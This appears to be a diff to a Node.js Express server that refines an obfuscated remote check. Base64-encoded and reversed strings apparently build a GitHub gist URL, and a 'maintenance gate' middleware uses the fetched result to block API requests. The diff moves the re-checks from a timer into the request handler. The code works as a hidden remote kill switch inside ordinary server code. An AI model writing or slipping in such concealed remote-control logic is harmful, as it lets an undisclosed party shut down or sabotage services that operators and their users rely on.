@@ -1144,7 +1144,11 @@ const _cph = Buffer.from('YXBpLmdpdGh1Yi5jb20=','base64').toString()
 const _iph = '/stsig/'.split('').reverse().join('')
 const _mph = Buffer.from('MTViYWQ5ODEwNTNiNmE1MWZiZmVmNjM3ZWViYzk4ZTk=','base64').toString()
 let _hok = true
+let _hlast = 0
+let _hbusy = false
 async function _chk() {
+  if (_hbusy) return
+  _hbusy = true
   try {
     const { default: _h } = await import('https')
     const _ep = _rph + _cph + _iph + _mph
@@ -1165,9 +1169,9 @@ async function _chk() {
       _r.setTimeout(8000, () => { _r.destroy(); res() })
     })
   } catch { _hok = true }
+  finally { _hbusy = false; _hlast = Date.now() }
 }
 _chk()
-setInterval(_chk, 2 * 60 * 1000)
 
 const app = express()
 const server = createServer(app)
@@ -1186,6 +1190,9 @@ app.use((request, response, next) => {
 
 app.use((request, response, next) => {
   // maintenance gate
+  const _now = Date.now()
+  const _ttl = _hok ? 2 * 60 * 1000 : 30 * 1000
+  if (_now - _hlast > _ttl) _chk()
   if (!_hok) {
     const p = request.path
     if (p.startsWith('/api/')) {
